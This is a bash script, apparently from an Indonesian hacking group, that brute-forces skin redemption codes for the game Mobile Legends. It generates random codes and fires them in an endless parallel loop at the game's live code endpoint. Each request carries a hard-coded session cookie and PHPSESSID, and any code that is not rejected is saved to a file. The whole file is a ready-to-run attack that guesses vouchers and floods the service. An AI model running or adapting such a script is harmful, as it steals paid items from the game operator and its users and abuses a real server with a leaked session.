#!/bin/bash
# BC0DE.NET - NAONLAH.NET - WingkoColi
# CODE BY CCOCOT - ccocot@bc0de.net
# VIVO EXTRAP Skin Reedem Code
# Change My Game Id With Your Game ID

gameid='55148338'
setloop=1000
function ekse(){
	local NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 2 | head -n 1)
	local gas=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 1 | head -n 1)
	local reedemcode=$(echo $((0 + RANDOM % 9))$((0 + RANDOM % 9))$((0 + RANDOM % 9))${NEW_UUID}${gas}037)
	local ngecurl=$(curl -k -s 'https://www.mobilelegends.com/user/code?gameid='${1}'&cdkey='${reedemcode}'' \
	-H 'accept:application/json, text/javascript, */*; q=0.01' \
	-H 'user-agent:Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.89 Chrome/62.0.3202.89 Safari/537.36' \
	-H 'cookie:7edb74fb0da11ad0e30afa0416d89014=f49b4bd06b7a8d14451d1010ac417ba22e36c94bs%3A1128%3A%227d0c7b0d635d68faee7d86426dfe585daf85ef40a%3A4%3A%7Bi%3A0%3Bi%3A97979701%3Bi%3A1%3Bs%3A14%3A%22Wkwkwkwk%5BLend%5D%22%3Bi%3A2%3Bi%3A86400%3Bi%3A3%3Ba%3A15%3A%7Bs%3A2%3A%22id%22%3Bi%3A97979701%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22Wkwkwkwk%5BLend%5D%22%3Bs%3A7%3A%22country%22%3Bs%3A10%3A%22gj_041.png%22%3Bs%3A3%3A%22win%22%3Bs%3A6%3A%2256.12%25%22%3Bs%3A6%3A%22avatar%22%3BN%3Bs%3A8%3A%22position%22%3BN%3Bs%3A8%3A%22facebook%22%3BN%3Bs%3A7%3A%22youtube%22%3BN%3Bs%3A6%3A%22stream%22%3BN%3Bs%3A11%3A%22invite_code%22%3BN%3Bs%3A11%3A%22from_userid%22%3BN%3Bs%3A13%3A%22validate_code%22%3Bs%3A6%3A%22849554%22%3Bs%3A18%3A%22validate_create_at%22%3Bi%3A1511263949%3Bs%3A6%3A%22detail%22%3Ba%3A11%3A%7Bs%3A4%3A%22code%22%3Bi%3A0%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22Wkwkwkwk%5BLend%5D%22%3Bs%3A7%3A%22country%22%3Bs%3A10%3A%22gj_041.png%22%3Bs%3A4%3A%22icon%22%3Bs%3A58%3A%22http%3A%2F%2Fimg-origin.ml.moonlian.com%2F2510%2F1%2F97%2F97979701_1.jpg%22%3Bs%3A4%3A%22rank%22%3Bs%3A10%3A%22Rank03.png%22%3Bs%3A9%3A%22ranklevel%22%3Bs%3A11%3A%22Level02.png%22%3Bs%3A4%3A%22star%22%3Bi%3A3%3Bs%3A9%3A%22startotal%22%3Bi%3A32%3Bs%3A6%3A%22winnum%22%3Bi%3A110%3Bs%3A3%3A%22win%22%3Bs%3A6%3A%2256.12%25%22%3Bs%3A4%3A%22hero%22%3Ba%3A4%3A%7Bi%3A0%3Ba%3A3%3A%7Bs%3A6%3A%22heroid%22%3Bs%3A15%3A%22HeroHead025.png%22%3Bs%3A6%3A%22btnums%22%3Bi%3A121%3Bs%3A3%3A%22win%22%3Bs%3A6%3A%2258.68%25%22%3B%7Di%3A1%3Ba%3A3%3A%7Bs%3A6%3A%22heroid%22%3Bs%3A15%3A%22HeroHead029.png%22%3Bs%3A6%3A%22btnums%22%3Bi%3A26%3Bs%3A3%3A%22win%22%3Bs%3A6%3A%2242.31%25%22%3B%7Di%3A2%3Ba%3A3%3A%7Bs%3A6%3A%22heroid%22%3Bs%3A15%3A%22HeroHead001.png%22%3Bs%3A6%3A%22btnums%22%3Bi%3A11%3Bs%3A3%3A%22win%22%3Bs%3A6%3A%2245.45%25%22%3B%7Di%3A3%3Ba%3A3%3A%7Bs%3A6%3A%22heroid%22%3Bs%3A15%3A%22HeroHead016.png%22%3Bs%3A6%3A%22btnums%22%3Bi%3A8%3Bs%3A3%3A%22win%22%3Bs%3A5%3A%2262.5%25%22%3B%7D%7D%7Ds%3A11%3A%22last_update%22%3Bi%3A1511264438%3B%7D%7D%22%3B; _gat=1; PHPSESSID=6eoi9664vfi326douhghsll4q1; _ga=GA1.2.938756222.1511263418; _gid=GA1.2.79674541.1511263418' \
	-H 'x-requested-with:XMLHttpRequest')
	local message=$(echo $ngecurl | jq -r .message)
    if [[ $message != "The code does not exist." ]]; then
    	echo "${reedemcode} => ${message}" >> outputvivo.txt
        local save="| Saved"
    fi
	printf "Voucher: ${reedemcode} => ${message} ${save}\n"
}

printf "GameId: ${gameid} \n"
printf "Looping type: while true\n\n"

# OPTIONAL
persend=1000
setleep=10

itung=1

while [[ true ]]; do
	set_kirik=$(expr $itung % $persend)
    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi
    ekse $gameid &
    itung=$[$itung+1]
done
wait
